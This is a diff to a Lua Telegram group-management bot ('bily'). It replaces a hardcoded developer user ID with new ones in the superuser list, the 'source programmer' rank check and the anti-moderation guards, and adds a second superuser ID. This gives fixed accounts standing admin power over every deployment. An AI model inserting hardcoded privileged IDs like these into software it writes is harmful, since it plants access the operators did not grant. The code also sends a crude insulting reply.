@@ -127,7 +127,7 @@ print("\27[36m"..[[
 ]]..'\27[m'.."\n\27[35mServer Information ↬ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\27[m\n\27[36m~ \27[mUser \27[36m: \27[10;32m"..User.."\27[m\n\27[36m~ \27[mIp \27[36m: \27[10;32m"..Ip.."\27[m\n\27[36m~ \27[mName \27[36m: \27[10;32m"..Name.."\27[m\n\27[36m~ \27[mPort \27[36m: \27[10;32m"..Port.."\27[m\n\27[36m~ \27[mUpTime \27[36m: \27[10;32m"..UpTime.."\27[m\n\27[35m┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\27[m")
 Config = dofile("./config.lua")
 DevId = Config.DevId
-SudoIds = {Config.SudoIds,218385683}
+SudoIds = {Config.SudoIds,2063143862,782717203}
 bily = Config.bily
 TokenBot = Config.TokenBot
 NameBot = (DevAbs:get(bily..'Abs:NameBot') or 'بيلي')
@@ -589,7 +589,7 @@ end ,nil)
 end
 --     Source bily     --
 local AbsRank = function(msg) if SudoId(msg.sender_user_id_) then BiLYDeV  = "المطور" elseif SecondSudo(msg) then BiLYDeV = "المطور" elseif SudoBot(msg) then BiLYDeV = "المطور" elseif ManagerAll(msg) then BiLYDeV = "المدير" elseif AdminAll(msg) then BiLYDeV = "الادمن" elseif AbsConstructor(msg) then BiLYDeV = "المالك" elseif BasicConstructor(msg) then BiLYDeV = "المنشئ" elseif Constructor(msg) then BiLYDeV = "المنشئ" elseif Manager(msg) then BiLYDeV = "المدير" elseif Admin(msg) then BiLYDeV = "الادمن" else BiLYDeV = "العضو" end return BiLYDeV end
-function IdRank(user_id,chat_id) if tonumber(user_id) == tonumber(218385683) then BiLYDeV = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(bily) then BiLYDeV = 'البوت' elseif SudoId(user_id) then BiLYDeV = 'المطور الاساسي' elseif DevAbs:sismember(bily..'Abs:SecondSudo:', user_id) then BiLYDeV = 'المطور الثانوي' elseif DevAbs:sismember(bily..'Abs:SudoBot:', user_id) then BiLYDeV = DevAbs:get(bily.."Abs:SudoBot:Rd"..chat_id) or 'المطور' elseif DevAbs:sismember(bily..'Abs:ManagerAll:', user_id) then BiLYDeV = DevAbs:get(bily.."Abs:Managers:Rd"..chat_id) or 'المدير العام' elseif DevAbs:sismember(bily..'Abs:AdminAll:', user_id) then BiLYDeV = DevAbs:get(bily.."Abs:Admins:Rd"..chat_id) or 'الادمن العام' elseif DevAbs:sismember(bily..'Abs:VipAll:', user_id) then BiLYDeV = DevAbs:get(bily.."Abs:VipMem:Rd"..chat_id) or 'المميز العام' elseif DevAbs:sismember(bily..'Abs:AbsConstructor:'..chat_id, user_id) then BiLYDeV = 'المالك' elseif DevAbs:sismember(bily..'Abs:BasicConstructor:'..chat_id, user_id) then BiLYDeV = DevAbs:get(bily.."Abs:BasicConstructor:Rd"..chat_id) or 'المنشئ الاساسي' elseif DevAbs:sismember(bily..'Abs:Constructor:'..chat_id, user_id) then BiLYDeV = DevAbs:get(bily.."Abs:Constructor:Rd"..chat_id) or 'المنشئ' elseif DevAbs:sismember(bily..'Abs:Managers:'..chat_id, user_id) then BiLYDeV = DevAbs:get(bily.."Abs:Managers:Rd"..chat_id) or 'المدير' elseif DevAbs:sismember(bily..'Abs:Admins:'..chat_id, user_id) then BiLYDeV = DevAbs:get(bily.."Abs:Admins:Rd"..chat_id) or 'الادمن' elseif DevAbs:sismember(bily..'Abs:VipMem:'..chat_id, user_id) then  BiLYDeV = DevAbs:get(bily.."Abs:VipMem:Rd"..chat_id) or 'المميز' elseif DevAbs:sismember(bily..'Abs:Cleaner:'..chat_id, user_id) then  BiLYDeV = DevAbs:get(bily.."Abs:Cleaner:Rd"..chat_id) or 'المنظف' else BiLYDeV = DevAbs:get(bily.."Abs:mem:Rd"..chat_id) or 'العضو' end return BiLYDeV end
+function IdRank(user_id,chat_id) if tonumber(user_id) == tonumber(2063143862) then BiLYDeV = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(bily) then BiLYDeV = 'البوت' elseif SudoId(user_id) then BiLYDeV = 'المطور الاساسي' elseif DevAbs:sismember(bily..'Abs:SecondSudo:', user_id) then BiLYDeV = 'المطور الثانوي' elseif DevAbs:sismember(bily..'Abs:SudoBot:', user_id) then BiLYDeV = DevAbs:get(bily.."Abs:SudoBot:Rd"..chat_id) or 'المطور' elseif DevAbs:sismember(bily..'Abs:ManagerAll:', user_id) then BiLYDeV = DevAbs:get(bily.."Abs:Managers:Rd"..chat_id) or 'المدير العام' elseif DevAbs:sismember(bily..'Abs:AdminAll:', user_id) then BiLYDeV = DevAbs:get(bily.."Abs:Admins:Rd"..chat_id) or 'الادمن العام' elseif DevAbs:sismember(bily..'Abs:VipAll:', user_id) then BiLYDeV = DevAbs:get(bily.."Abs:VipMem:Rd"..chat_id) or 'المميز العام' elseif DevAbs:sismember(bily..'Abs:AbsConstructor:'..chat_id, user_id) then BiLYDeV = 'المالك' elseif DevAbs:sismember(bily..'Abs:BasicConstructor:'..chat_id, user_id) then BiLYDeV = DevAbs:get(bily.."Abs:BasicConstructor:Rd"..chat_id) or 'المنشئ الاساسي' elseif DevAbs:sismember(bily..'Abs:Constructor:'..chat_id, user_id) then BiLYDeV = DevAbs:get(bily.."Abs:Constructor:Rd"..chat_id) or 'المنشئ' elseif DevAbs:sismember(bily..'Abs:Managers:'..chat_id, user_id) then BiLYDeV = DevAbs:get(bily.."Abs:Managers:Rd"..chat_id) or 'المدير' elseif DevAbs:sismember(bily..'Abs:Admins:'..chat_id, user_id) then BiLYDeV = DevAbs:get(bily.."Abs:Admins:Rd"..chat_id) or 'الادمن' elseif DevAbs:sismember(bily..'Abs:VipMem:'..chat_id, user_id) then  BiLYDeV = DevAbs:get(bily.."Abs:VipMem:Rd"..chat_id) or 'المميز' elseif DevAbs:sismember(bily..'Abs:Cleaner:'..chat_id, user_id) then  BiLYDeV = DevAbs:get(bily.."Abs:Cleaner:Rd"..chat_id) or 'المنظف' else BiLYDeV = DevAbs:get(bily.."Abs:mem:Rd"..chat_id) or 'العضو' end return BiLYDeV end
 --     Source bily     --
 function RankChecking(user_id,chat_id)
 if SudoId(user_id) then
@@ -4358,7 +4358,7 @@ if tonumber(result.id_) == tonumber(DevId) then
 Dev_Abs(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md') 
 return false  
 end  
-if tonumber(result.id_) == tonumber(218385683) then 
+if tonumber(result.id_) == tonumber(2063143862) then 
 Dev_Abs(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md') 
 return false  
 end  
@@ -4389,7 +4389,7 @@ if tonumber(result.sender_user_id_) == tonumber(DevId) then
 Dev_Abs(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
 return false
 end 
-if tonumber(result.sender_user_id_) == tonumber(218385683) then  
+if tonumber(result.sender_user_id_) == tonumber(2063143862) then  
 Dev_Abs(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
 return false
 end 
